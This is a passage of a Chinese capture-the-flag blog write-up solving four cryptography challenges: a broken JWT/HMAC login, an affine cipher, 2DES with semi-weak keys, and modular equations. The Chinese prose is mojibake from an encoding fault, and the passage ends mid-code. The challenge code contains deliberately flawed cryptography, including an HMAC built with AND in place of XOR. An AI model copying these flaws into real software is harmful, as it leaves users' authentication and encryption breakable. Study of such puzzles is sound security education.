class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">message0: <span class="built_in">bytes</span>, message1: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(byte0 &amp; byte1 <span class="keyword">for</span> byte0, byte1 <span class="keyword">in</span> <span class="built_in">zip</span>(message0, message1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params">message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(message).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hmac_sha256</span>(<span class="params">key: <span class="built_in">bytes</span>, message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    blocksize = <span class="number">64</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) &gt; blocksize:</span><br><span class="line">        key = sha256(key)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) &lt; blocksize:</span><br><span class="line">        key = key + <span class="string">b'\x00'</span> * (blocksize - <span class="built_in">len</span>(key))</span><br><span class="line">    o_key_pad = xor(<span class="string">b'\x5c'</span> * blocksize, key)</span><br><span class="line">    i_key_pad = xor(<span class="string">b'\x3c'</span> * blocksize, key)</span><br><span class="line">    <span class="keyword">return</span> sha256(o_key_pad + sha256(i_key_pad) + message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256_jwt_dumps</span>(<span class="params">data: <span class="built_in">dict</span>, exp: <span class="built_in">int</span>, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">    header = {<span class="string">'alg'</span>: <span class="string">'HS256'</span>, <span class="string">'typ'</span>: <span class="string">'JWT'</span>}</span><br><span class="line">    payload = {<span class="string">'sub'</span>: data, <span class="string">'exp'</span>: exp}</span><br><span class="line">    header = base64.urlsafe_b64encode(json.dumps(header).encode())</span><br><span class="line">    payload = base64.urlsafe_b64encode(json.dumps(payload).encode())</span><br><span class="line">    signature = hmac_sha256(key, header + <span class="string">b'.'</span> + payload)</span><br><span class="line">    signature = base64.urlsafe_b64encode(signature).rstrip(<span class="string">b'='</span>)</span><br><span class="line">    <span class="keyword">return</span> header + <span class="string">b'.'</span> + payload + <span class="string">b'.'</span> + signature</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256_jwt_loads</span>(<span class="params">jwt: <span class="built_in">bytes</span>, exp: <span class="built_in">int</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">dict</span> | <span class="literal">None</span>:</span><br><span class="line">    header_payload, signature = jwt.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    sig = hmac_sha256(key, header_payload)</span><br><span class="line">    sig = base64.urlsafe_b64encode(sig).rstrip(<span class="string">b'='</span>)</span><br><span class="line">    <span class="keyword">if</span> sig != signature:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'JWT error'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        header, payload = header_payload.split(<span class="string">b'.'</span>)[<span class="number">0</span>], header_payload.split(<span class="string">b'.'</span>)[-<span class="number">1</span>]</span><br><span class="line">        header = json.loads(base64.urlsafe_b64decode(header))</span><br><span class="line">        payload = json.loads(base64.urlsafe_b64decode(payload))</span><br><span class="line">        <span class="keyword">if</span> (header.get(<span class="string">'alg'</span>) != <span class="string">'HS256'</span>) <span class="keyword">or</span> (header.get(<span class="string">'typ'</span>) != <span class="string">'JWT'</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'JWT error'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(payload.get(<span class="string">'exp'</span>)) &lt; exp:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'JWT error'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'JWT error'</span>)</span><br><span class="line">    <span class="keyword">return</span> payload.get(<span class="string">'sub'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username: <span class="built_in">str</span>, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">if</span> re.fullmatch(<span class="string">r'[A-z0-9]+'</span>, username) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"'username' format error."</span>)</span><br><span class="line">    <span class="keyword">return</span> sha256_jwt_dumps({<span class="string">'username'</span>: username}, <span class="built_in">int</span>(time.time()) + <span class="number">86400</span>, key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">token: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">    userdata = sha256_jwt_loads(token, <span class="built_in">int</span>(time.time()), key)</span><br><span class="line">    <span class="keyword">return</span> userdata[<span class="string">'username'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'=================='</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'1. Register'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'2. Login'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'3. Exit'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">'&gt; '</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt;= choice &lt;= <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> choice</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'Error choice !'</span>, end=<span class="string">'\n\n'</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key = os.urandom(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        choice = menu()</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            username = <span class="built_in">input</span>(<span class="string">'Username &gt; '</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                token = register(username, key)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">'Username Error !'</span>, end=<span class="string">'\n\n'</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f'Token : <span class="subst">{token.<span class="built_in">hex</span>()}</span>'</span>, end=<span class="string">'\n\n'</span>)</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">2</span>:</span><br><span class="line">            token = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">'Token &gt; '</span>))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                username = login(token, key)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">'Token Error !'</span>, end=<span class="string">'\n\n'</span>)</span><br><span class="line">            <span class="keyword">if</span> username == <span class="string">'Admin'</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f'FLAG : <span class="subst">{FLAG}</span>'</span>, end=<span class="string">'\n\n'</span>)</span><br><span class="line">                sys.exit()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">'FLAG : TSC{???}'</span>, end=<span class="string">'\n\n'</span>)</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">3</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></tbody></table></figure><p>ç¨‹å¼è£¡æ²’æœ‰æª¢æŸ¥æˆ–é™åˆ¶ä½¿ç”¨è€…æ˜¯å¦èƒ½ä»¥ â€œAdminâ€ ä½œç‚ºå¸³è™Ÿï¼Œå› æ­¤åªè¦è¨»å†Šâ€œAdminâ€ ä¸¦æˆåŠŸç²å¾— Tokenï¼Œå†ä½¿ç”¨è©² Token é€²è¡Œç™»å…¥å°±å¯ä»¥å¾—åˆ° FLAGã€‚</p><p>flag: <code>TSC{Wr0nG_HM4C_7O_L3A_!!!}</code></p><h3 id="classic">Classic <a href="#classic" class="headerlink"></a></h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">flag = os.getenv(<span class="string">"FLAG"</span>) <span class="keyword">or</span> <span class="string">"TSC{test_flag}"</span></span><br><span class="line"></span><br><span class="line">charset = string.digits + string.ascii_letters + string.punctuation</span><br><span class="line">A, B = secrets.randbelow(<span class="number">2</span>**<span class="number">32</span>), secrets.randbelow(<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">set</span>((A * x + B) % <span class="built_in">len</span>(charset) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(charset)))) == <span class="built_in">len</span>(charset)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">""</span>.join(charset[(charset.find(c) * A + B) % <span class="built_in">len</span>(charset)] <span class="keyword">for</span> c <span class="keyword">in</span> flag)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></tbody></table></figure><p>åŠ å¯†å¾Œçš„ flag : <code>o`15~UN;;U~;F~U0OkW;FNW;F]WNlUGV"</code></p><p>åŠ å¯†æ–¹æ³•</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">charset = string.digits + string.ascii_letters + string.punctuation</span><br><span class="line">A, B = secrets.randbelow(<span class="number">2</span>**<span class="number">32</span>), secrets.randbelow(<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">set</span>((A * x + B) % <span class="built_in">len</span>(charset) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(charset)))) == <span class="built_in">len</span>(charset)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">""</span>.join(charset[(charset.find(c) * A + B) % <span class="built_in">len</span>(charset)] <span class="keyword">for</span> c <span class="keyword">in</span> flag)</span><br></pre></td></tr></tbody></table></figure><p>å·²çŸ¥ï¼š</p><ul><li>T-&gt;o : (55 * A + B) % 94 = 24</li><li>S-&gt;` : (54 * A + B) % 94 = 89</li><li>C-&gt;1 : (38 * A + B) % 94 = 1</li><li>{-&gt;5 : (90 * A + B) % 94 = 5</li><li>}-&gt;â€ : (92 * A + B) % 94 = 63</li></ul><p>å¾å‰å…©å€‹å¯ä»¥çŸ¥é“ï¼š1 * A % 94 = 24-89 = -65 = 29<br>ç”¨å¾Œå…©å€‹é©—è­‰ä¸€ä¸‹ï¼š2 * A % 94 = 63-5 = 58</p><p>å¯ä»¥ç›´æ¥å‡è¨­ A = 29 <span class="math inline">\(\rightarrow\)</span>(55 * A + B) % 94 = (91 + B) % 94 = 24 <span class="math inline">\(\rightarrow\)</span> å‡è¨­ B = 27</p><p>é©—è­‰ä¸€ä¸‹ (92 * 29 + 27) % 94 = 63 æ²’éŒ¯</p><p>æ¥è‘—å°±</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">50</span>]: <span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    ...:     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">94</span>):</span><br><span class="line">    ...:         <span class="keyword">if</span> ((i*A + B) % <span class="number">94</span> == charset.find(c)):</span><br><span class="line">    ...:             <span class="built_in">print</span>(charset[i], end=<span class="string">""</span>)</span><br><span class="line">    ...: </span><br><span class="line">TSC{c14551c5_c1ph3r5_4r5_fr4g17e}</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{c14551c5_c1ph3r5_4r5_fr4g17e}</code></p><h3 id="des">2DES <a href="#des" class="headerlink"></a></h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg: <span class="built_in">bytes</span>, key1, key2</span>):</span><br><span class="line">    des1 = DES.new(key1, DES.MODE_ECB)</span><br><span class="line">    des2 = DES.new(key2, DES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> des2.encrypt(des1.encrypt(pad(msg, des1.block_size)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = <span class="built_in">open</span>(<span class="string">'/flag.txt'</span>, <span class="string">'r'</span>).read().strip().encode()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"This is a 2DES encryption service."</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"But you can only control one of the key."</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"1. Encrypt flag"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"2. Decrypt flag"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"3. Exit"</span>)</span><br><span class="line">        option = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">"&gt; "</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> option == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># I choose a key</span></span><br><span class="line">            <span class="comment"># You can choose another one</span></span><br><span class="line">            keyset = [<span class="string">"1FE01FE00EF10EF1"</span>, <span class="string">"01E001E001F101F1"</span>, <span class="string">"1FFE1FFE0EFE0EFE"</span>]</span><br><span class="line">            key1 = <span class="built_in">bytes</span>.fromhex(choice(keyset))</span><br><span class="line">            key2 = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">"Enter key2 (hex): "</span>).strip())</span><br><span class="line"></span><br><span class="line">            ciphertext = encrypt(flag, key1, key2)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Here is your encrypted flag:"</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"..."</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            sleep(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> ciphertext[:<span class="number">4</span>] == flag[:<span class="number">4</span>]:</span><br><span class="line">                <span class="built_in">print</span>(ciphertext)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"Hmmm... What a coincidence!"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"System error!"</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> option == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Decryption are disabled"</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> option == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Bye!"</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Invalid option"</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p>é¡Œç›®æ˜¯æœƒæŠŠ flag ç”¨ DES åŠ å¯†å…©æ¬¡ï¼Œç¬¬ä¸€æ¬¡æ˜¯æœƒéš¨æ©Ÿé¸æ“‡<code>["1FE01FE00EF10EF1", "01E001E001F101F1", "1FFE1FFE0EFE0EFE"]</code>å…¶ä¸­ä¸€çµ„ç•¶ä½œé‡‘é‘°åŠ å¯†ï¼Œç¬¬äºŒæ¬¡åŠ å¯†çš„é‡‘é‘°å¯ä»¥è‡ªå·±è¨­å®šï¼Œæ–¼æ˜¯æˆ‘å°±æƒ³åˆ°äº†<code>åŠå¼±é‡‘é‘°</code>ï¼ŒæŸ¥äº†ä»¥ä¸‹é€™æ¨£çš„æ±è¥¿ï¼Œç™¼ç¾ä¸‰å€‹éƒ½æ˜¯åŠå¼±é‡‘é‘°ï¼Œæˆ‘å°±æ‹¿ä¸€å€‹å»è©¦äº†ï¼Œç„¶å¾Œå°±å¾—åˆ°flag äº† /</p><ul><li>0x011F011F010E010E and 0x1F011F010E010E01</li><li>0x01E001E001F101F1 and 0xE001E001F101F101</li><li>0x01FE01FE01FE01FE and 0xFE01FE01FE01FE01</li><li>0x1FE01FE00EF10EF1 and 0xE01FE01FF10EF10E</li><li>0x1FFE1FFE0EFE0EFE and 0xFE1FFE1FFE0EFE0E</li><li>0xE0FEE0FEF1FEF1FE and 0xFEE0FEE0FEF1FEF1</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. Encrypt flag</span><br><span class="line">2. Decrypt flag</span><br><span class="line">3. Exit</span><br><span class="line">&gt; 1</span><br><span class="line">Enter key2 (hex): E01FE01FF10EF10E</span><br><span class="line">Here is your encrypted flag:</span><br><span class="line">...</span><br><span class="line">b'TSC{th3_Key_t0_br34k_DES_15_tHe_keY}\x04\x04\x04\x04'</span><br><span class="line">Hmmm... What a coincidence!</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{th3_Key_t0_br34k_DES_15_tHe_keY}</code></p><h3 id="æˆ‘å¾ä¾†éƒ½ä¸è¦ºå¾—ç®—å¯†ç¢¼å­¸é–‹å¿ƒé">æˆ‘å¾ä¾†éƒ½ä¸è¦ºå¾—ç®—å¯†ç¢¼å­¸é–‹å¿ƒé <a href="#æˆ‘å¾ä¾†éƒ½ä¸è¦ºå¾—ç®—å¯†ç¢¼å­¸é–‹å¿ƒé" class="headerlink"></a></h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>).read().strip().encode()</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">16</span>)</span><br><span class="line">r = [randrange(<span class="number">1</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f'p = <span class="subst">{p}</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># You have 5 unknown random numbers</span></span><br><span class="line"><span class="comment"># But you can only get 4 hashes</span></span><br><span class="line"><span class="comment"># It is impossible to recover the flag, right?</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    h = flag[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        h = (h + (j+<span class="number">1</span>) * r[j]) % p</span><br><span class="line">        r[j] = h</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"hash[<span class="subst">{i}</span>] = <span class="subst">{h}</span>"</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> rr <span class="keyword">in</span> r:</span><br><span class="line">    key += rr</span><br><span class="line">    key *= <span class="number">2</span>**<span class="number">16</span></span><br><span class="line"></span><br><span class="line">key = pad(long_to_bytes(key), <span class="number">16</span>)</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">ciphertext = aes.encrypt(pad(flag, AES.block_size))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"ciphertext = <span class="subst">{ciphertext}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure><p>ç°¡å–®ä¾†èªªå°±æ˜¯ä»–æœ‰ r0~r4äº”å€‹æœªçŸ¥æ•¸ï¼Œä½†æ˜¯ä»–åªæœ‰å››å€‹å–æ¨¡çš„ç­‰å¼ï¼Œæ‰€ä»¥æˆ‘å€‘æšèˆ‰å…¶ä¸­ä¸€é …ï¼Œå°±èƒ½æ¨å‡ºå‰©ä¸‹å››é …ï¼Œç„¶å¾Œå¸¶å»è§£AES çœ‹è§£ä¸è§£çš„å‡ºä¾†ï¼Œè§£å‡ºä¾†å°±å°äº†ï¼Œä½†æ˜¯å¯¦éš›ä¸Šé‚£å€‹ç­‰å¼è¶…é†œï¼Œæˆ‘æ˜¯ç”¨Geogebra ç®—ï¼Œé‚„æ˜¯ç®—äº†å¥½ä¸€é™£å­æ‰å¯«å‡ºæ­£ç¢ºçš„ç­‰å¼ï¼Œå¦‚ä¸‹</p><p><span class="math display">\[\begin{cases}r_0 + 2r_1 + 3r_2 + 4r_3 + 5r_4 + 84 \equiv 1934 \pmod{42899} \\15r_0 + 28r_1 + 36r_2 + 36r_3 + 25r_4 + 1343 \equiv 22627 \pmod{42899}\\140r_0 + 250r_1 + 291r_2 + 244r_3 + 125r_4 + 13072 \equiv 36616\pmod{42899} \\1050r_0 + 1820r_1 + 1980r_2 + 1476r_3 + 625r_4 + 100948 \equiv 21343\pmod{42899}\end{cases}\]</span></p><p>ç„¶å¾Œå« ChatGPT å¹«æˆ‘å¯«å€‹æ±‚è§£çš„ç¨‹å¼ç¢¼ï¼Œç„¶å¾Œå°±ä¾ä¾å¸¶å…¥é©—è­‰å°±å¯ä»¥å¾—åˆ°Flag äº†</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 